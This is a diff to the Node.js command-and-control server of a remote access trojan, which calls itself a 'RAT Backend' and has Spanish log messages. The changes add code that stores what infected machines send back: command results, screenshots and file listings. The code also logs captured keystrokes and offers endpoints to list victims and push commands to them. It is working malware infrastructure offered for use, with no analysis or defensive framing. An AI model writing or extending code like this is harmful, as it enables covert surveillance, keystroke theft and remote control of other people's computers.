@@ -32,12 +32,9 @@ db.run(`CREATE TABLE IF NOT EXISTS commands (
   timestamp INTEGER
 )`);
 
-// Servidor HTTP + WebSocket
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
-
-// Clientes conectados activamente
-const activeClients = new Map(); // clientId -> WebSocket
+const activeClients = new Map();
 
 // ============ WEBSOCKET ============
 wss.on('connection', (ws, req) => {
@@ -45,14 +42,12 @@ wss.on('connection', (ws, req) => {
   const ip = req.socket.remoteAddress || '0.0.0.0';
   const hostname = req.headers['x-hostname'] || 'unknown';
 
-  // Registrar cliente en BD
   db.run(`INSERT OR REPLACE INTO clients (id, ip, lastSeen, hostname) VALUES (?, ?, ?, ?)`,
     [clientId, ip, Date.now(), hostname]);
 
   activeClients.set(clientId, ws);
   console.log(`[+] Cliente conectado: ${clientId} desde ${ip}`);
 
-  // Heartbeat
   const interval = setInterval(() => {
     if (ws.readyState === WebSocket.OPEN) {
       ws.send(JSON.stringify({ type: 'ping' }));
@@ -66,26 +61,54 @@ wss.on('connection', (ws, req) => {
   ws.on('message', (message) => {
     try {
       const data = JSON.parse(message);
+      console.log('[+] Mensaje del cliente:', data.type);
+
       if (data.type === 'pong') {
         db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
       }
-      if (data.type === 'screenshot') {
-        // Guardar screenshot en BD o enviar al panel
-        console.log(`[+] Screenshot recibido de ${clientId}`);
-      }
-      if (data.type === 'keylog') {
-        console.log(`[+] Keylog recibido de ${clientId}: ${data.text}`);
-      }
+
+      // ===== GUARDAR RESULTADOS =====
       if (data.type === 'cmd_result') {
-        db.run(`UPDATE commands SET result = ?, status = 'done' WHERE id = ?`,
-          [data.result, data.cmdId]);
+        db.get(
+          `SELECT id FROM commands WHERE clientId = ? AND status = 'pending' ORDER BY timestamp DESC LIMIT 1`,
+          [clientId],
+          (err, row) => {
+            if (row) {
+              db.run(
+                `UPDATE commands SET result = ?, status = 'done' WHERE id = ?`,
+                [data.result, row.id]
+              );
+              console.log(`[+] Resultado guardado para comando ${row.id}`);
+            } else {
+              db.run(
+                `INSERT INTO commands (clientId, command, params, result, status, timestamp) VALUES (?, ?, ?, ?, 'done', ?)`,
+                [clientId, 'unknown', '', data.result, Date.now()]
+              );
+            }
+          }
+        );
       }
+
+      if (data.type === 'screenshot_result') {
+        db.run(
+          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'screenshot', ?, 'done', ?)`,
+          [clientId, JSON.stringify({ image: data.image }), Date.now()]
+        );
+        console.log(`[+] Screenshot guardado para ${clientId}`);
+      }
+
+      if (data.type === 'keylog') {
+        console.log(`[+] Keylog de ${clientId}: ${data.text}`);
+      }
+
       if (data.type === 'files_result') {
-        // Guardar listado de archivos
-        console.log(`[+] Archivos recibidos de ${clientId}`);
+        db.run(
+          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'files', ?, 'done', ?)`,
+          [clientId, data.files, Date.now()]
+        );
       }
     } catch (e) {
-      console.log('Error en mensaje:', e.message);
+      console.log('[-] Error en mensaje:', e.message);
     }
   });
 
@@ -99,11 +122,9 @@ wss.on('connection', (ws, req) => {
 
 // ============ API REST ============
 
-// Obtener lista de clientes
 app.get('/api/clients', (req, res) => {
   db.all('SELECT * FROM clients ORDER BY lastSeen DESC', (err, rows) => {
     if (err) return res.status(500).json({ error: err.message });
-    // Añadir estado online
     const result = rows.map(c => ({
       ...c,
       online: activeClients.has(c.id)
@@ -112,7 +133,6 @@ app.get('/api/clients', (req, res) => {
   });
 });
 
-// Renombrar cliente
 app.post('/api/rename', (req, res) => {
   const { id, customName } = req.body;
   if (!id || !customName) return res.status(400).json({ error: 'Faltan datos' });
@@ -122,7 +142,6 @@ app.post('/api/rename', (req, res) => {
   });
 });
 
-// Enviar comando a un cliente
 app.post('/api/command', (req, res) => {
   const { clientId, command, params } = req.body;
   if (!clientId || !command) return res.status(400).json({ error: 'Faltan datos' });
@@ -140,7 +159,6 @@ app.post('/api/command', (req, res) => {
   res.json({ ok: true, cmdId });
 });
 
-// Obtener historial de comandos
 app.get('/api/commands/:clientId', (req, res) => {
   const { clientId } = req.params;
   db.all('SELECT * FROM commands WHERE clientId = ? ORDER BY timestamp DESC LIMIT 50',
@@ -150,16 +168,14 @@ app.get('/api/commands/:clientId', (req, res) => {
     });
 });
 
-// Ruta raíz para verificar que el servidor funciona
 app.get('/', (req, res) => {
-  res.json({ 
+  res.json({
     status: 'RAT Backend running',
     clients: activeClients.size,
     uptime: process.uptime()
   });
 });
 
-// Iniciar servidor
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`[+] Servidor RAT backend corriendo en puerto ${PORT}`);
   console.log(`[+] Clientes activos: 0`);
